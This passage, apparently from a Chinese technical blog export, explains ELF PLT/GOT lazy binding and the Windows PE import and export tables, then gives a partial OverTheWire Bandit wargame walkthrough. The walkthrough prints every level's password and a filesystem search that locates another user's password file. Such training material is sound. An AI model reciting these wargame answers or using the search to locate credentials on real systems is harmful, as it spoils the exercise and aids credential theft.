另外，共享目标文件的段通常包含与位置无关的代码。这使得段的虚拟地址在不同的进程中不同，但不影响执行行为。尽管系统为每个进程选择独立的虚拟地址，仍能维持段的相对位置。因为位置独立的代码在段与段之间使用相对寻址，内存虚地址之间的差异必须与文件中虚拟地址之间的差异相匹配。 程序解释器 可执行文件可以包含PT_INTERP程序头部元素。在exec() 期间，系统从PT_INTERP段中检索路径名，并从解释器文件的段创建初始的进程映像。也就是说，系统并不使用原来可执行文件的段映像，而是为解释器构造一个内存映像。接下来是解释器从系统接收控制，为应用程序提供执行环境。 解释器可以有两种方式接受控制： 接受一个文件描述符，读取可执行文件并将其映射到内存中 根据可执行文件的格式，系统可能把可执行文件加载到内存中，而不是为解释器提供一个已经打开的文件描述符。 共享目标文件被加载到内存中时，其地址可能在各个进程中呈现不同的取值。系统在 mmap 以及相关服务所使用的动态段区域创建共享目标文件的段。因此，共享目标解释器通常不会与原来的可执行文件的原始段地址发生冲突。 可执行文件被加载到内存中固定地址，系统使用来自其程序头部表的虚拟地址创建各个段。因此，可执行文件解释器的虚拟地址可能会与原来的可执行文件的虚拟地址发生冲突。解释器要负责解决这种冲突。 动态加载程序 在构造使用动态链接技术的可执行文件时，连接编辑器向可执行文件中添加一个类型为PT_INTERP的程序头部元素，告诉系统要把动态链接器激活，作为程序解释器。系统所提供的动态链接器的位置是和处理器相关的。 Exec() 和动态链接器合作，为程序创建进程映像，其中包括以下动作： (1).将可执行文件的内存段添加到进程映像中； (2).把共享目标内存段添加到进程映像中； (3).为可执行文件和它的共享目标执行重定位操作； (4).关闭用来读入可执行文件的文件描述符，如果动态链接程序收到过这样的文件描述符的话； (5).将控制转交给程序，使得程序好像从 exec 直接得到控制。 PLT&amp;GOT 位置独立的代码一般不能包含绝对的虚拟地址。全局偏移表在私有数据中包含绝对地址，从而使得地址可用，并且不会影响位置独立性和程序代码的可共享性。程序使用位置独立的寻址引用其全局偏移表，并取得绝对值，从而把位置独立的引用重定向到绝对位置。 全局偏移表中最初包含其重定位项中要求的信息。在系统为可加载目标创建内存段以后，动态链接器要处理重定位项，其中有一些重定位项的类型是R_386_GLOB_DAT，是对全局偏移表的引用。动态链接器确定相关的符号取值，计算其绝对地质，并将相应的内存表格项目设置为正确的数值。尽管在链接编辑器构造一个目标文件时还无法知道绝对地质，动态链接器清楚所有内存段的地址，因而能够计算其中所包含的符号的绝对地址。 全局偏移表（GOT，）用来将位置独立的地址计算重定向到绝对位置，与此相似，过程链接表（PLT）能够把位置独立的函数调用重定向到绝对位置。链接编辑器物能解析从一个可执行文件/共享目标到另一个可执行文件/共享目标控制转移（例如函数调用）。因此，链接编辑器让程序把控制转移给过程链接表中的表项。在System V中，过程链接表位于共享正文中，不过它们使用位于私有的全局偏移表中的地址。 动态链接器能够确定目标处的绝对地址，并据此修改全局偏移表的内存映像。动态链接器因此能够对表项进行重定位，并且不会影响程序代码的位置独立性和可共享性。可执行文件和共享目标文件拥有各自独立的过程链接表。 绝对过程链接表： 位置独立的过程链接表： 如图所示，过程链接表命令针对绝对代码（图 1）和位置独立的代码（图 2）使用不同的操作数寻址模式。尽管如此，它们对动态链接器的接口还是相同的。 动态链接器和程序“合作”，通过过程链接表和全局偏移表解析符号引用： 1.在第一次创建程序的内存映像时，动态链接器为全局偏移表的第二和第三项设置特殊值。 2.如果过程链接表是位置独立的，全局偏移表必须位于 %bx 中，进程映像中的每个共享目标文件都有自己的过程链接表，控制向过程链接表项的传递仅发生在同一个目标文件中。因此，调用函数用负责在调用过程链接表项之前设置全局偏移表的基址寄存器。 3.出于说明的目的，假定程序调用了 name1，name1 将控制传输给标号 .PLT1。 4.第一条指令跳转到 name1 的全局偏移表项的地址。最初，全局偏移表中包含后面的 pushl 指令的地址，而不是 name1 的真实地址。 5.接下来，程序将重定位偏移（offset）压栈。重定位偏移是一个 32 位非负数，是在重定位表中的字节偏移量。指定的重定位表项的类型为 R_386_JMP_SLOT，其偏移将给出在前面的 jmp 指令中使用的 GOT 表项。重定位项也包含一个符号表索引，借以告诉动态链接器被引用的符号是什么，在这里是 name1。 6.在将重定位偏移压栈后，程序会跳转到 .PLT0，也就是过程链接表的第一项。pushl 指令把第二个全局偏移表项（got_plus_4 或者 4(%ebx)）压入堆栈，因而为动态链接器提供了识别信息的机会。程序然后跳转到第三个 GOT 表项内保存的地址（got_plus_8 或者 8(%ebx)），后者将控制传递给动态链接器。 7.当动态链接器得到控制后，它恢复堆栈，查看指定的重定位项，寻找符号的值，将 name1 的“真实”地址存储于全局偏移表项中，并将控制传递给期望的目的地。 8.过程链接表项的后续执行将把控制直接传递给 name1，不会再次调用动态链接器。就是说 .PLT1 处的 jmp 将控制传递给 name1，而不会执行后面的 pushl 指令。 环境变量LD_BIND_NOW可以更改动态链接行为。如果其取值非空，动态链接器会在控制传递给程序之前，对过程链接表项进行计算。就是说动态链接器会在进程初始化的过程中处理类型为R_386_JMP_SLOT的重定位项。否则，动态链接器会对过程链接表实行懒惰计算，延迟符号解析和重定位，直到某个表项的第一次执行。 延迟绑定通常会提供整体的应用性能，因为未使用的符号不会引入额外的动态链接开销。尽管如此，有些应用情形会使得懒惰绑定不太合适。首先，对共享目标函数的第一次引用花的时间会超出后续调用，因为动态链接器要截获调用以便解析符号。一些应用不能容忍这种不可预测性。第二，如果发生了错误，动态链接器无法解析某个符号，动态链接器会终止程序。在懒惰绑定下，这类事情可能会发生任意多次。某些应用也可能无法容忍这种不可预测性。通过关闭懒惰绑定，动态链接器会迫使所有错误都发生在进程初始化期间，而不是应用程序接收控制以后。 Demo: 来看一个编译好的32位ELF可执行文件对libc.so的函数fgets()进行调用的例子。32位可执行文件与GOT的关系比较容易观察，因为在32位文件中没有用到IP相对地址，IP相对地址是在64位可执行文件中使用的: 18048481: e8 da fe ff ff call 8048360&lt;fgets@plt&gt; 地址0x8048360对应函数fgets()的PLT条目。接下来观察可执行文件中地址为0x8048360的内容： 123408048360&lt;fgets@plt&gt;: &#x2F;* A jmp into the GOT *&#x2F; 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; 对函数fgets()的调用会指向地址0x8048360，即函数fgets()的PLT跳转表条目。从前面反编译代码的输出中可以看到，有一个间接跳转指向存放在0x804a000中的地址，这个地址就是GOT条目，存放着libc共享库中函数fgets()的实际地址。 然而，动态链接器采用默认的延迟链接方式时，不会在函数第一次调用时就对地址进行解析。延迟链接意味着动态链接器不会在程序加载时解析每一个函数，而是在调用时通过.plt和.got.plt节（分别对应各自的过程链接表和全局偏移表）来对函数进行解析。可以通过修改LD_BIND_NOW环境变量将链接方式修改为严格加载，以便在程序加载的同时进行动态链接。动态链接器之所以默认采用延迟链接的方式，是因为延迟链接能够提高装载时的性能。不过，有时候有些不可预知的链接错误可能在程序运行一段时间后才能够发现。我在过去几年里也就碰到过一次这种情况。值得注意的是，有些安全特性，如只读重定位，只能在严格链接的模式下使用，因为.plt.got节是只读的。在动态链接器完成对.plt.got的补充之后才能够进行只读重定位，因此必须使用严格链接。 设函数fgets()是第一次被调用，动态链接器需要对fgets()的地址进行解析，并把值存入fgets()的GOT条目中。 1234567808049ff4 &lt;_GLOBAL_OFFSET_TABLE_&gt;: 8049ff4: 28 9f 04 08 00 00 sub %bl,0x804(%edi) 8049ffa: 00 00 add %al,(%eax) 8049ffc: 00 00 add %al,(%eax) 8049ffe: 00 00 add %al,(%eax) 804a000: 66 83 04 08 76 addw $0x76,(%eax,%ecx,1) 804a005: 83 04 08 86 addl $0xffffff86,(%eax,%ecx,1) 804a009: 83 04 08 96 addl $0xffffff96,(%eax,%ecx,1) 804a00d: 83 .byte 0x83 804a00e: 04 08 add $0x8,%al 重点注意地址0x08048366，该地址存储在GOT的0x804a000中。在低字节序中，低位字节排放在内存的低地址端，因此看上去是66 83 04 08。由于链接器还未对函数fgets()进行解析，故该地址并不是函数的地址，而是指向函数fgets()的PLT条目。再来看一下函数fgets()的PLT条目： 1234508048360 &lt;fgets@plt&gt;: 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; 因此，jmp *0x804a000 指令会跳转到地址0x804a000 中存放的0x8048366，即push $0x0指令。该push指令的作用是将fgets()的GOT条目入栈。fgets()的GOT条目偏移地址为0x0，对应的第一个GOT条目是为一个共享库符号值保留的，0x0实际上是第4个GOT条目，即GOT[3]。换句话说，共享库的地址并不是从GOT[0]开始的，而是从GOT[3]开始的，前3个条目是为其他用途保留的。 下面是GOT的3个偏移量。 GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关的信息。 GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。 GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。 fgets()的PLT存根（stub）的最后一条指令是jmp 8048350。该地址指向可执行文件的第一个PLT条目，即P LT- 0。 我们的可执行文件的P LT- 0存放了下面的代码： 1238048350: ff 35 f8 9f 04 08 pushl 0x8049ff8 8048356: ff 25 fc 9f 04 08 jmp *0x8049ffc 804835c: 00 00 add %al,(%eax) 第一条pushl指令将GOT[1]的地址压入栈中，前面提到过，GOT[1]中存放了指向link_map结构的地址. jmp *0x8049ffc指令间接跳转到第3个GOT条目，即GOT[2]，在GOT[2]中存放了动态链接器_dl_runtime_resolve()函数的地址，然后将控制权转给动态链接器，解析fgets()函数的地址。对函数fgets()进行解析后，后续所有对PLT条目fgets()的调用都会跳转到fgets()的代码本身，而不是重新指向PLT，再进行一遍延迟链接的过程。 1．调用fgets@PLT（即调用fgets函数）。 2．PLT代码做一次到GOT中地址的间接跳转。 3．GOT条目存放了指向PLT的地址，该地址存放在push指令中。 4．push $0x0指令将fgets() GOT条目的偏移量压栈。 5．最后的fgets() PLT指令是指向P LT- 0代码的jmp指令。 6．P LT- 0的第一条指令将GOT[1]的地址压栈，GOT[1]中存放了指向fgets()的link_map结构的偏移地址。 7．P LT- 0的第二条指令会跳转到GOT[2]存放的地址，该地址指向动态链接器的_dl_runtime_resolve函数，_dl_runtime_resolve函数会通过把fgets()函数的符号值加到.got.plt节对应的GOT条目中，来处理R_386_JUMP_SLOT重定位。 下一次调用fgets()函数时，PLT条目会直接跳转到函数本身，而不是再执行一遍重定位过程。 图示： 第一次动态链接该函数 之后：","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ELF文件","slug":"ELF文件","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"}]},{"title":"Windows_PE文件格式","slug":"Windows_PE文件","date":"2021-04-22T11:39:53.685Z","updated":"2021-04-22T17:08:15.083Z","comments":true,"path":"2021/04/22/Windows_PE文件/","link":"","permalink":"http://example.com/2021/04/22/Windows_PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"Windows_PE文件格式​ PE文件格式是理解Windows操作系统进程、内存、动态链接库加载的基础，本文结合逆向课所学和查询的资料简单做个总结。 1.PE文件基本介绍PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。 基本结构 从DOS头到节区头是PE头部分，其下的节区合称为PE体。 DOS头 主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。 大小为64字节，其中2个重要的成员分别是： e_magic:DOS签名（4D5A，MZ） e_lfanew：指示NT头的偏移（文件不同，值不同） DOS存根 stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。 NT头 结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成： 签名结构体，值为50450000h（“PE”00） 文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个： Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C； NumberOfSections：指出文件中存在的节区数量； SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度 Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合 可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个： Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码起始地址 ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF） SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位 SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小 SizeOfHeaders：指出整个PE头的大小 Subsystem：区分系统驱动文件和普通可执行文件 NumberOfRvaAndSize：指定DataDirectory数组的个数 DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组 节区头 节区头定义了各节区的属性。PE文件中code、data、resource等按照属性储存在不同的节区。好处是可以保证程序的安全性，将代码和数据分隔开，每个节区设计不同的访问权限。 类别 访问权限权限 code 执行、读取权限 data 非执行、读写权限 resource 非执行、读取权限 节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个： VirtualSize：内存中节区所占大小 VirtualAddress：内存中节区起始地址（RVA） SizeOfRawData：磁盘文件中节区所占大小 Charateristics：节区属性（bit OR） 内存映射(RVA_to_RAW)左边文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如下图所示）。 VA: Virtual Address 进程虚拟内存绝对地址 RVA: Relative Virtual Address 相对虚拟地址，指从某个基准位置开始的相对地址 ImageBase: PE文件的优先装载地址 转换关系如下：$$RVA+ImageBase=VA$$Why use VA and RVA? PE头内部信息大多以RVA形式存在。PE文件（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件。此时必须通过重定位将其加载到其他空白位置，若PE头用的是VA，则会造成无法正常访问。因此使用RVA来定位信息，即使发生重定位，只要相对于基准的相对地址没有发生变化，就能正常访问到指定信息不会发生问题。 Demo: If RVA=5000, File Offset=? ①首先查找RVA对应所在的节区 →位于第一个节区(.text) 图中ImageBase(01000000) ②计算公式 →$$RAW=RVA-VirtualAddress+PointerToRawData\\=5000-1000+400=4400$$ 2.What’s IATIAT: Import Address Table 导入地址表。 这个表保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。 先了解一下Windows的DDL DLL：Dynamic Linked Library 动态链接库 不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。 使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。 在对函数库进行更新时，只更新DLL文件，简单易行 DLL加载方式有两种：显式链接（Explicit Linking） 和 隐式链接（Implicit Linking） 显示链接：程序在使用DLL时进行加载，使用完毕后释放内存 隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存 IAT提供的机制与DLL的隐式链接有关 程序调用系统IAT表的时候具体实现过程： 假设我们程序中某处要用到MessageBoxA，那么这里会有两种形式，一种是先call到一个地址，这个地址中是一个jmp [A]，A中存放着数据，数据内容就是我们的MessageBox的入口地址。另一种情况是直接calll到MessageBoxA的入口地址即 [A],[A]是A地址存放的数据，A中存放的数据是MessageBox的入口地址，之所以叫做表也是这个原因，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数入口地址。 我们在OD中选择call了MessageBox的一行，用view 运行文件的方法查看，可以看到这里并不是函数入口地址，而是一个dword的数，这个十六进制数加上基址假设叫做B，我们跳过去看B，看到B中的数据是一个ASCII码的内容，即字符串MessageBox，也就是说，Windows在运行程序，即在加载前通过内部实现，把我们的字符串MessageBox换为了MessageBox的入口地址，这样我们在call 【A】的时候就是跳转到了MessageBox的入口地址。 下面引入一个结构体 IMAGE_IMPORT_DESCRIPTOR 该结构体位于 IMAGE_OPTIONAL_HEADER 的 IMAGE_DATA_DIRECTORY 中定位到第二个目录，即 IMAGE_DIRECTORY_ENTRY_IMPORT。该结构体保存了导入函数的 RVA 地址，通过该 RVA 地址可以定位到导入表的具体位置。 每一个导入的 DLL 都有一个对应的 IMAGE_IMPORT_DESCRIPTOR，并且以数组的形式存放在文件中的,定义如下 12345678910111213141516171819typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk;//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体 &#125;; DWORD TimeDateStamp;//可以忽略，一般为0 DWORD ForwarderChain;//一般为0 DWORD Name;//指向DLL的名称的RVA地址 DWORD FirstThunk;//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组&#125; IMAGE_IMPORT_DESCRIPTOR; 导入信息并不包含指定导入表的个数，而是以一个全为0的IMAGE_IMPORT_DESCRIPTOR 结构体作为结束标志。 下面是IMAGE_THUNK_DATA 结构体的定义: 123456789101112131415typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // 一个RVA地址，指向forwarder string DWORD Function; // PDWORD，被导入的函数的入口地址 DWORD Ordinal; // 该函数的序数 DWORD AddressOfData; // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32; 每一个 IMAGE_THUNK_DATA 对应一个 DLL 中的导入函数。与 IMAGE_IMPORT_DESCRIPTOR 类似，IMAGE_THUNK_DATA 在文件中也是一个数组，并以一个全为 “0” 的 IMAGE_THUNK_DATA 结束。 当该结构体值的最高位为 0 时，表示函数以函数名字符串的方式导入，这时该 DWORD 的值表示一个 RVA，并指向一个 IMAGE_IMPORT_BY_NAME 结构体： 1234567typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; //该函数的导出序数 BYTE Name[1]; // 该函数的名字&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 看起来可能有些绕，一会IAT一会INT的 The difference between IAT and INT: IMAGE_IMPORT_DESCRIPTOR结构体中的OriginalFirstThunk和FirstThunk都指向IMAGE_THUNK_DATA结构体。 当文件在磁盘上时，两者指向的是同一个 IMAGE_THUNK_DATA，而当文件载入内存时 OriginalFirstThunk 中保存的仍然是指向函数的 RVA，而 FirstThunk 指向的内存变成了由装载器填充的导入函数地址，即 IAT。 Look at this pictures:) 操作系统填充IAT大致流程如下： 1.找到导入表起始地址 2.找到第一个IID 3.根据IID的第四个字段确定dll库名称 4.根据IID的第五个字段确定IAT表地址 5.通过IAT字符串指针定位到目标函数名称。 6.用目标函数地址修改IAT的字符串指针。 7.修改下一处IAT 8.IAT项为0，修改完毕 9.找到下一个IID从第3步开始重复上面的操作。 What’s EAT与INT相对应，EAT（Exoprt Adress Table）顾名思义，导出表。 EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。（这点对比IAT：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。 EAT结构体位于PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0] IMAGE_EXPORT_DIRECTORY结构： 依旧先放结构体定义 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; //保留 总是定义为0 DWORD TimeDateStamp; //文件生成时间 WORD MajorVersion; //主版本号 一般不赋值 WORD MinorVersion; //次版本号 一般不赋值 DWORD Name; //模块的真实名称 DWORD Base; //索引基数 加上序数就是函数地址数组的索引值 DWORD NumberOfFunctions; //地址表中个数 DWORD NumberOfNames; //名称表的个数 DWORD AddressOfFunctions; //输出函数地址的RVA DWORD AddressOfNames; //输出函数名字的RVA DWORD AddressOfNameOrdinals; //输出函数序号的RVA&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; Demo: kernel32.dll 从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下： 利用AddressOfName成员转到“函数名称数组” “函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index） 利用AddressOfNameOrdinals成员，转到ordinal数组 在ordinal数组中通过name_index查找相应ordinal值 利用AddressOfFunctionis成员转到“函数地址数组”（EAT） 在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址 SummaryPE文件是逆向的一个基础，了解PE文件的结构和动态连接的过程有利于我们更好地理解高级调试。","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PE文件","slug":"PE文件","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"}]},{"title":"linux_base题解","slug":"linux_Base","date":"2021-04-21T10:04:58.210Z","updated":"2021-04-21T09:55:54.615Z","comments":true,"path":"2021/04/21/linux_Base/","link":"","permalink":"http://example.com/2021/04/21/linux_Base/","excerpt":"","text":"linux_base题解重新系统地过一遍，主要是一些Linux的基本命令和基础知识。 Level_0What is SSH ?According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Host Name : bandit.labs.overthewire.org Username : bandit0 Password : bandit0 Port Number : 2220 1ssh bandit0@bandit.labs.overthewire.org -p 2220 Level_0➡Level_1Usage of ls and cat:1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level_1➡Level_2cat the file stars with dash:1234bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9bandit1@bandit:~$ cat &lt;-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level_2➡Level_3Use” \\“ to escape character1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level_3➡Level_4Usage of command : ls 、cd:The ls command is used to view the contents of a directory. By default, this command will display the contents of your current working directory. If you want to see the content of other directories, type ls and then the directory’s path. For example, enter ls /home/username/Documents to view the content of Documents. There are variations you can use with the ls command: ls -R will list all the files in the sub-directories as well ls -a will show the hidden files ls -al will list the files and directories with detailed information like the permissions, size, owner, etc. Hidden file: start with . is hidden file 123456789101112bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level_4➡Level_5Usage of command : file1file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...] -b 列出辨识结果时，不显示文件名称。 -c 详细显示指令执行过程，便于排错或分析程序执行的情形。 -f&lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。 -L 直接显示符号连接所指向的文件的类别。 -m&lt;魔法数字文件&gt; 指定魔法数字文件。 -v 显示版本信息。 -z 尝试去解读压缩文件的内容。 1234567891011121314151617181920bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level_5➡Level_6Usage of file:12345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level_6➡Level_7Learn about redirection:Analyse: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size So this is exp: find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null / from root folder -user the owner of the file. -group the group owner of the file. -size the size of the file. 2&gt;/dev/null redirects error messages to null so that they do not show on stdout. 1234bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level_7➡Level_8Learn about the pipe and usage if grep:grep commandIt lets you search through all the text in a given file. To illustrate, grep blue notepad.txt will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully. 1234567-i 忽略大小写-E 启用POSIX扩展正则表达式-P 启用perl正则-o 只输出正则表达式匹配的内容-w 整字匹配-v 不匹配的-n 输出行号 12bandit7@bandit:~$ cat data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level_8➡Level_9Learn about the sort and uniq:sort: 1sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--help][--verison][文件] -u 在输出行中去除重复行。 -r sort默认的排序方式是升序，如果想改成降序，就加个-r即可。 -n sort要以数值来排序 -t 指定分割符 -k 指定第几列排序 uniq: 1uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--help][--version][输入文件][输出文件] -c, –count 在每行前显示该行重复次数 -d, –repeated 只输出重复的行 -D, –all-repeated 只输出重复的行，不过有几行输出几行 -f, –skip-fields=N -f 忽略的段数，-f 1 忽略第一段 -i, –ignore-case 不区分大小写 -s, –skip-chars=N 与-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符 -u, –unique 去除重复的后，全部显示出来，根mysql的distinct功能上有点像 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level_9➡Level_10Usage of grep:strings : export strings in binary file 12345678910111213141516bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt |grep =Binary file (standard input) matchesbandit9@bandit:~$ strings data.txt |grep =========== the*2i&quot;4=:G e========== password&lt;I=zsGiZ)========== isA=|t&amp;EZdb=c^ LAh=3G*SF=s&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level_10➡Level_11What’s base64?Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。 why base64？ This_is_why_base64 12bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level_11➡Level_12ROT13:I_know_what’s_ROT13 command tr: 123456tr [选项]… 集合1 [集合2]选项说明：-c, -C, –complement 用集合1中的字符串替换，要求字符集为ASCII。-d, –delete 删除集合1中的字符而不是转换-s, –squeeze-repeats 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。-t, –truncate-set1 先删除第一字符集较第二字符集多出的字符 12bandit11@bandit:~$ cat data.txt | tr &quot;A-Za-z&quot; &quot;N-ZA-Mn-za-m&quot;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level_12➡Level_13Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar: Linux hexdump命令一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。 1hexdump [选项] [文件]... 123456789-n length 只格式化输入文件的前length个字节。-C 输出规范的十六进制和ASCII码。-b 单字节八进制显示。-c 单字节字符显示。-d 双字节十进制显示。-o 双字节八进制显示。-x 双字节十六进制显示。-s 从偏移量开始输出。-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;。 每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如： 1234%02d：两位十进制%03x：三位十六进制%02o：两位八进制%c：单个字符等 还有一些特殊的用法： 